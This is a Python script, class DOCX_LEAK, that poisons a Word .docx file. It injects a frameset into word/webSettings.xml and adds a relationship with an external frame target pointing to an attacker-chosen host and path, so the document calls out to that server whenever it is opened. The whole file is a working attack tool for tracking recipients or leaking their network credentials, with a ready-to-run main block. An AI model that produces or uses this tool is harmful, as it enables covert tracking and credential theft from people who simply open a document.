import tempfile,zipfile
import io,os
 
from update_zip_file import UpdateableZipFile


class DOCX_LEAK:
    
    def __init__(self,docx_path,host,url_path):

        self.docx_path = docx_path 
        self.host = host 
        self.url_path = url_path
        self.docx_file_read = zipfile.ZipFile(self.docx_path,"r")

    def write_word_webSettings_xml(self):

        with UpdateableZipFile(self.docx_path, "a") as z:
            z.writestr(
                "word/webSettings.xml",
                self.insert_word_webSettings_xml().encode()
            )

    def write__word__rels_document_xml_rels(self):

        with UpdateableZipFile(self.docx_path, "a") as z:
            z.writestr(
            "word/_rels/webSettings.xml.rels",
            self.insert_word__rels_document_xml_rels()
        )

    def insert_word_webSettings_xml(self,element_id="rId1"):
        return self.insert_before(
            self.read_word_webSettings_xml(),
            "<w:optimizeForBrowser/><w:allowPNG/></w:webSettings>",
            f"<w:frameset><w:framesetSplitbar><w:w w:val='60'/><w:color w:val='auto'/><w:noBorder/></w:framesetSplitbar><w:frameset><w:frame><w:name w:val='3'/><w:sourceFileName r:id='{element_id}'/><w:linkedToFile/></w:frame></w:frameset></w:frameset>"
        )

    def insert_word__rels_document_xml_rels(self):
        return f"<?xml version='1.0' encoding='UTF-8' standalone='yes'?><Relationships xmlns='http://schemas.openxmlformats.org/package/2006/relationships'><Relationship Id='rId1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame' Target='{self.host}/{self.url_path}' TargetMode='External'/></Relationships>"

   
    def read_word_webSettings_xml(self):
        return self.docx_file_read.read("word/webSettings.xml").decode("utf-8")

    def read_word__rels_document_xml_rels(self):
        return self.docx_file_read.read("word/_rels/document.xml.rels").decode("utf-8")

    def insert_after(self,string, string_behind, string_insert):
        i = string.find(string_behind)
        return string[:i + len(string_behind)] + string_insert + string[i + len(string_behind):]

    def insert_before(self,string,string_before,string_insert):
        idx = string.index(string_before)
        return string[:idx] + string_insert + string[idx:]

    def poision_file(self):
        self.write_word_webSettings_xml()
        self.write__word__rels_document_xml_rels()
 

if __name__ == "__main__":
    dxl = DOCX_LEAK("<docx-filename>","<host>","<path>")
    dxl.poision_file()